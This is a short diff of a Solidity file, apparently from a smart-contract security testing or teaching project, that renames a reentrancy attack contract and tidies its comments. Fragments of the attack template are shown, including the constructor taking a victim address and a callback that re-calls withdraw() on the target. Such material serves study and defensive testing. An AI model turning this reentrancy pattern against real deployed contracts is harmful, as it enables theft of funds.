@@ -5,19 +5,19 @@ import "./Reentrancy.sol";
 
 import "forge-std/console.sol";
 
-contract ReentrancyAttack is Reentrancy {
+contract ReentrancyExampleAttack is Reentrancy {
     // The victim to perform reentrancy attack on
     address target;
 
     /**
-     * @param victim The address on the contract to perform reentrancy on
+     * @param victim The address of the contract to perform reentrancy on
      */
     constructor(address victim) {
         target = victim;
     }
 
     /**
-     * @dev Main body of the attack. Make any calls to the target contract, and continue reentrancy attack in the below callback function
+     * @dev Initiates the reentrancy attack. Make any calls to the target contract, and continue reentrancy attack in the below callback function
      */
     function initiateAttack() external override {
         // Initiate call to the target contract
@@ -41,7 +41,6 @@ contract ReentrancyAttack is Reentrancy {
             target.call(abi.encodeWithSelector(bytes4(keccak256("withdraw()"))));
         }
     }
-
 
     /**
      * @dev Function run after the attack is executed
